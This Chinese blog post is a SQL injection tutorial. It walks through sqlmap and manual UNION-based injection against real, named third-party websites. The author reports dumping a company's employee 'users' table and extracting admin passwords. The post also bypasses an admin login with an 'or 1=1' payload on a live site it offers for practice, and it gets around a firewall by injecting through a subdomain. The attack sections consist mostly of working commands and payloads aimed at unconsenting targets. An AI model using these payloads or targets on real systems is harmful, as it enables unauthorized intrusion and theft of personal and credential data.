---
title: SQL注入入门笔记
date: 2024-12-24 00:46:21
tags: SqlMap
excerpt: 根据Udemy教程，博主教你SQL注入从人门到入钔。
categories:
  - 其他
  - SqlMap
---

# Example1

> 谁从小还没有一个当黑帽子的梦想呢，所以就来讲讲SQL💉🩸吧...

## 环境要求

- **sqlmap**命令行工具
- 使用**Go**语言安装包：**waybackruls** (需要在自己的电脑上部署)

## 寻找目标 url

对目标网站使用：

```sql
echo https://xxx | waybackurls
```

命令来打印历史 **url** 信息。如果运气好🍀会返回该网站的很多相关`url`信息，也有可能没有任何信息。在其中找到一个类似：`https://xxxx/?value=xxx`的查询路由，记住这条路由接下来使用**sqlmap**进行注入。

## sqlmap 💉注入

### 【注入数据库】--current-db

使用这条命令进行注入:

```sql
sqlmap -u 'https://xxx?value=xxx' --current-db --random-agent
```

这条命令会检索当前的数据库的信息，遇到`redirect`直接`Y`回车即可。

可选参数以及作用：

- `--random-agent`:如果注入后提示 **timeout** 超时⚠️，则应尝试该命令，伪装成随机的代理。
- `--level=5 --threads=5`：该命令可以使注入更快。

如果成功，将会得到一个提示信息(假设它的数据库是`goodmoning_db`)：

```sql
current database: 'goodmoning_db' --random-agent
```

> 很显然，我没有得到它。但是如果你得到了这个，恭喜你🎉，可以继续往下注入！

### 【注入tables】-D 'xxx_db' --tables

在获得数据库后，我们可以通过`sqlmap`查询该库中有哪些`table`：

```sql
sqlmap -u 'https://mygm.in/?cat=1' -D goodmorning_db --tables --radom-agent
```

这里不妨假设你已经得到了一个可疑的查询`url`，并且你通过上面的步骤得到了一个数据库`goodmorning_db`，我们使用了随机代理来提高成功率。假设你成功了，那么你会得到一个`tables`的列表。

> 如果你发现有点满，试试上面提到的`--threads=5`和`--level=5`这两个参数，我说过，他们可以提速！

### 【注入table】- T xxx --dump

假设在上一步你运气很好，得到了一个`tables`的表，其中有一个`users`的`table`：

```sql
xxx
xxx
xxx
users
xxx
```

那你就可以使用如下的命令进行

```sql
sqlmap -u 'https://mygm.in/?cat=1' -D goodmorning_db -T users --dump --threads=5 --random-agent
```

如果成功了，你将会得到表中的数据📊，运气好🍀将可能中奖得到管理员的账号密码，但有可能得到的密码是被加密的，你可能需要去解密它。	

## 小结

虽然看起来很简单，但很可能第一步你都没办法实现，根据本人亲自试验，大部分网站无法使用`waybackurls`进行历史的追溯，如果能追溯的网站，也不太能被你找到漏洞。

## 实战

本来本人觉得学完可能也用不到，结果转折来了，我在网上根据网站的特征还真找到一个可以注入的网站，下面来一波教学～

首先，根据这篇博客，我们就能最大程度的找到能够sql注入的网站：[寻找sql注入网站的方法](https://zhuanlan.zhihu.com/p/57751709)，根据文章的方法，我们在搜索栏中输入想要的网站特征🤔：

![截屏2024-11-20 07.09.04](https://p.ipic.vip/tp7n0q.png)

一路试下来找到这样一个网站：

![截屏2024-11-20 07.10.03](https://p.ipic.vip/8ddqzr.png)

我们进去，在路由最后加一个引号会发现网站出现变化，原本搜索出来的内容消失了，这就代表出现了错误，只是没有显示给我们看而已！

![截屏2024-11-20 07.11.52](https://p.ipic.vip/r3qxfq.png)

继续往下寻找信息，会发现加后面加上`' order by 1 -- -`网站正常显示，但是如果` order by 8 -- -`就又消失了，说明了两点：

- 网站对`sql注入`基本不防护
- 该数据表有**7**列

使用`order by 8`会出现异常：

![截屏2024-11-20 07.15.40](https://p.ipic.vip/ipad0p.png)

但是使用`order by 1`正常显示：

![截屏2024-11-20 07.31.24](https://p.ipic.vip/huzwhp.png)

所有的这一切都在告诉我们一个信息，这个网站随便注入，所以打开`kali`终端进行sqlmap注入。

第一步，查询对应的数据库：

![截屏2024-11-20 07.19.29](https://p.ipic.vip/2lrjh9.png)

得到信息，数据库名为**bygptech**，这下跑不掉了。

![截屏2024-11-20 07.21.17](https://p.ipic.vip/geyrxo.png)

利用该库名查询内部表：

 ![截屏2024-11-20 07.24.42](https://p.ipic.vip/rj9o72.png)

查到内部的表如下：

![截屏2024-11-20 07.25.06](https://p.ipic.vip/6j03np.png)

这里面我看`users`最不爽😕，所以先拿它下手🤓，注入`users`：

![截屏2024-11-20 07.26.27](https://p.ipic.vip/6au8t1.png)

拿到`users`内部数据，保存在该目录：

![截屏2024-11-20 07.27.13](https://p.ipic.vip/34bunt.png)

将`csv`拷贝到虚拟机外，工作结束🥸：

> 可以看出来，这里的数据大多都是该公司的员工信息。

![截屏2024-11-20 07.27.57](https://p.ipic.vip/xdpxcr.png)

> 本人第一次**hack**别人的网站，有点小激动，各位大佬都坐好，误笑本菜。

# Example2

> Example1中使用了sqlmap一把梭，这次使用手动注入的方法。建议提前安装好Firefox浏览器，不然会很痛苦。

## 获取列数

首先使用`'`单引号来尝试注入网站，如果网站在被使用`'`注入后发生了变化，说明sql注入有概率可行。

通过在`url`后加上下面的代码来获取列的数量。

```mysql
' order by 数字 -- -
```

该网站的sql代码原理如下:

> 注意下面有三个引号，其中两遍的引号都是数据库查询自带的，中间由于我们手动添加了一个引号，构造出了一个绕过的代码，请自行理解。
>
> `-- -`：左边两个`-`表示注释，但是右边额外加了个一有点不明所以的`-`，这是因为在sql中，如果注释右边没有内容，有可能引发错误，所以一般会添加一个字符来占位，为了省事就直接使用`-`来作为注释的内容🥵。

```sql
select * from table where id='9' order by 3 -- - ';
```

将这里的`column`换成数字就可以按照指定列来进行排序，所以如果列的序号存在能被查询到结果，否则查询到的结果为空。

SQL中的原理如下：

- 首先创建了一张表作为测试

  <img src="https://p.ipic.vip/gb1irc.png" alt="截屏2024-11-24 18.45.46" style="zoom: 25%;" />

- 插入数据

  <img src="https://p.ipic.vip/mmnbsk.png" alt="截屏2024-11-24 18.47.55" style="zoom:25%;" />

- 正常查询的结果：

  <img src="https://p.ipic.vip/eh96vl.png" alt="截屏2024-11-24 18.48.57" style="zoom:25%;" />

- 经过`order by` 的排序后的结果：

  <img src="https://p.ipic.vip/qzyywm.png" alt="截屏2024-11-24 18.49.52" style="zoom:25%;" />

- 将成绩改成列的序号

  <img src="https://p.ipic.vip/krf7q7.png" alt="截屏2024-11-24 18.50.41" style="zoom:25%;" />



然后在Firefox中安装`HackerBar V2`这个扩展，请不要错误安装`HackBar`，没有V2后缀的版本是收费的。

<img src="https://p.ipic.vip/nq3x1r.png" alt="HackerV2扩展" style="zoom:25%;" />

确认列数后并确保你安装了`HackBar V2`，我们按下`F12`，对于博阳科技官网，我发现他有7列。

![截屏2024-11-24 19.04.50](https://p.ipic.vip/78tuyk.png)

## 寻找注入点

选择**SQL**>**Union**>**Union All Select Statement**，输入你的列数，自动生成了如下内容：

```sql
UNION ALL SELECT 1,2,3,4,5,6,7
```

复制它，将它替换原来的**order by**功能，url变成了：

```sql
http://www.bygptech.com/about.php?id=9 ' UNION ALL SELECT 1,2,3,4,5,6,7 -- 垃圾网站
```

这相当于是在说，把7列的查询结果合并成一张表交给前端，但是实际上你这么做了页面也没有任何的变化。你需要将它改为：

```sql
http://www.bygptech.com/about.php?id=-9 ' UNION ALL SELECT 1,2,3,4,5,6,7 -- 垃圾网站
```

> 你可能已经注意到了，我们把id的查询改为了-9，但其实你可以试试，id等于多少并不重要，你可以随意将它改为123或者-1231之类的任何值，但只要他不是一个有效的值，你就可以绕过正常的查询。

我们还是继续来猜测sql中的原理：

<img src="https://p.ipic.vip/oobi6w.png" alt="截屏2024-11-24 19.13.21" style="zoom:25%;" />

如果没有绕过，union 查询将会有一个正确查询到的结果，并上我们后面自己添加的三个值，这就是我们要修改id的值的原因以及原理。

<img src="https://p.ipic.vip/ua6cgi.png" alt="截屏2024-11-24 19.15.40" style="zoom:25%;" />

我们之所以需要获取列数量的信息，就是因为下面这个例子，如果Union查询并上的列数量不一致就会报错。

<img src="https://p.ipic.vip/5glyq2.png" alt="截屏2024-11-24 19.16.34" style="zoom:25%;" />

再来一个例子：

<img src="https://p.ipic.vip/6p659q.png" alt="截屏2024-11-24 19.18.33" style="zoom:25%;" />

我么可以得到结论，使用id="-9"是为了让查询到的id结果为空，这样最后的结果只有我们union上的数据作为给前端唯一数据，才能让我们想要的数据渲染到页面上。**UNION SELECT**后面的合并数量要和table中的列数量一致，但是值是什么都行。

## 嗅探数据库基本信息

根据结果，我们可以看到，页面只渲染了第二列和第四列位置的值，所以我们只需要将**2**和**4**改成我们想知道的值，他就会被渲染到页面上，我们就可以嗅探到数据库内部的一些重要信息，例如数据库版本等。

<img src="https://p.ipic.vip/fjlcin.png" alt="截屏2024-11-24 19.22.31" style="zoom:25%;" />

例如，可以把url中的2换成`database()`，然后你就可以看到数据库的名字是什么了。

<img src="https://p.ipic.vip/d5mhv4.png" alt="截屏2024-11-24 19.25.27" style="zoom:25%;" />

像这样的sql内建函数有很多，我们不一定记得住，不过没有关系！☝️🤓我们不是安装了`HackBar V2`吗，骇客神条会给你答案，下面是操作方法：

<img src="https://p.ipic.vip/d9tdhg.png" alt="截屏2024-11-24 19.26.54" style="zoom:25%;" />

在`HackBar V2`中选择**SQL**>**Union**>**Basic info column**，得到的就是基本的信息函数。

```sql
CONCAT_WS(CHAR(32,58,32),user(),database(),version())
```

## 嗅探表明



我们可以使用如下命令

```sql
http://www.bygptech.com/about.php?id=114514 ' UNION ALL SELECT 1,2,3,group_concat(table_name),5,6,7 from information_schema.tables where table_schema=database() -- 垃圾网站
```

然后你会得到`database()`这张表中的所有表名，我们来分析一下🧐：

首先查询这句**sql**，能得到一个关于`databse()`数据库的表，其中有两列需要关注：`TABLE_NAME`，`TABLE_SCHEMA`。这句话从`information_schema`这个信息数据库中查询`tables`表，并从`tables`表中筛选出数据库为`database()`的信息。

```sql
SELECT * FROM information_schema.`TABLES` WHERE table_schema=DATABASE();
```

<img src="https://p.ipic.vip/7b0uos.png" alt="截屏2024-11-24 19.42.43" style="zoom: 25%;" />

通过`group_cancat()`可以将某一列中的值拼成一句，就得到了所有的**table**。

<img src="https://p.ipic.vip/hcdw60.png" alt="截屏2024-11-24 19.44.38" style="zoom:25%;" />

查询到表的集合会被渲染在页面上：

<img src="https://p.ipic.vip/7yv6x9.png" alt="截屏2024-11-24 19.48.53" style="zoom:25%;" />

唯一的问题就是，它不是很简单易读，所以可以这样做来增加它的易读性，也就是在每一个`,`后面增加一个换行。

```sql
http://www.bygptech.com/about.php?id=114514 ' UNION ALL SELECT 1,group_concat(table_name, '<br>'),3,4,5,6,7 from information_schema.tables where table_schema=database() -- 垃圾网站
```

<img src="https://p.ipic.vip/aquozr.png" alt="截屏2024-11-24 19.50.27" style="zoom:25%;" />

> 它们看起来很棒🎉不是吗？

## 嗅探列名



接下来我们将继续使用`group_concat()`来获取这里`user`表中的所有列名。

我们可以通过`information`中的`COLUMNS`这张表来得到所有数据库和数据表的列名信息，包括`user`。

<img src="https://p.ipic.vip/suwu2o.png" alt="截屏2024-11-24 19.56.03" style="zoom: 25%;" />

如果将**TABLE_NAME**限制为具体的表名，再将结果进行`group_concat()`就可以在页面显示所有的列名。

<img src="https://p.ipic.vip/rxnqy5.png" alt="截屏2024-11-24 19.57.47" style="zoom:25%;" />

所以，使用下面的命令来获取该网站的`trade`表中的列名：

```sql
http://www.bygptech.com/about.php?id=114514 ' UNION ALL SELECT 1,group_concat(column_name, '<br>'),3,4,5,6,7 from information_schema.columns where table_name='trade' -- 垃圾网站
```

可以嗅探到列名如下：

<img src="https://p.ipic.vip/834z30.png" alt="截屏2024-11-24 20.02.34" style="zoom:25%;" />

## 嗅探数据

接下来我们试试嗅探`admin`表中的密码：

> admin表中的列如下：

```
adminid
,adminname
,password
,addtime
```

```sql
http://www.bygptech.com/about.php?id=114514 ' union select 1,group_concat(password, '<br>'),3,4,5,6,7 from admin; -- -
```



# Example 3

## 灵活使用payloads

> 在这个例子将会教你如何绕过admin登陆表单，仅限于一些没有防护措施的网站。

就本人写这篇文章的时间节点，下面这个网站仍然可以作为你的实验：

```apl
https://www.sspf.in/admin/
```

搜索: `sql payloads github`，或者访问这个链接: [Github注入网站](https://github.com/payloadbox/sql-injection-payload-list)

进入这个网站，你能看到很多注入的命令，使用这些命令作为表单的输入：

<img src="https://p.ipic.vip/ksrhgh.png" alt="截屏2024-11-24 22.52.09" style="zoom:25%;" />

这里我输入`' or 1=1 limit 1 -- -`作为**Username**，`'`作为**Password**，结果也是相当粗暴（成功绕过后台登陆）：

<img src="https://p.ipic.vip/ggzu04.png" alt="截屏2024-11-24 22.53.44" style="zoom:25%;" />

# Example 4

> 再这个例子中，你将会得到更强的提升，我将会以一个带有域名防火墙的网站作为例子。

## 安装工具

你需要一个`subfinder`，这是一个基于Go语言的命令行工具，你可以通过下面的命令安装他，不过前提是你已经安装了Go，如果没有，使用**brew**来安装Go再继续。

```apl
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

## 尝试注入

这是我们需要黑入的网站，我已经帮你找好了它的注入点：

访问下面这个**url**这是我们需要攻击的目标：

```sql
https://nied.co.in/course.php?course=1
```

根据之前所学，如果想要手动黑入该网站，需要先嗅探列的数量：

```
https://nied.co.in/course.php?course=1 ' order by 40 -- -
```

根据算法的知识，我们可以使用二分法来测试列的数量，这样时间复杂度可以到达指数级别。根据本人亲测，该网站有40列。

下一步就是打开黑客条V2来进行Union查询。

```sql
https://nied.co.in/course.php?course=1 ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40
```

然后你就会遇到今天最幸运的事情，没错，一个防火墙 - "FireWall"！😄

<img src="https://p.ipic.vip/i0uzug.png" alt="截屏2024-11-25 00.18.21" style="zoom:25%;" />

你以为这就结束了吗，不不不，我们可以做到，相信黑帽子！对于防火墙来说，很有可能只是对特定的域名做了防火墙的防护。所以如果使用子域名来进行注入，就有可能成功。

## 使用 subfinder

打开终端，终于轮到`subfinder`登场💡：

```sql
subfinder -d nied.co.in
```

由于网站在外🕸️，速度较慢，我们等待一段时间⌛️。

![截屏2024-11-25 00.22.11](https://p.ipic.vip/ynzh23.png)

到这里，所有的问题都已经解决，该网站的数据库将向你敞开，尽情地用💉扎它吧。将原来的域名替换成这里的域名。例如，将域名换成**mail.nied.co.in**是亲测有效的注入域名：

```sql
https://mail.nied.co.in/course.php?course=1 ' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40
```

在浏览器中输入后将会得到该网站的信息。
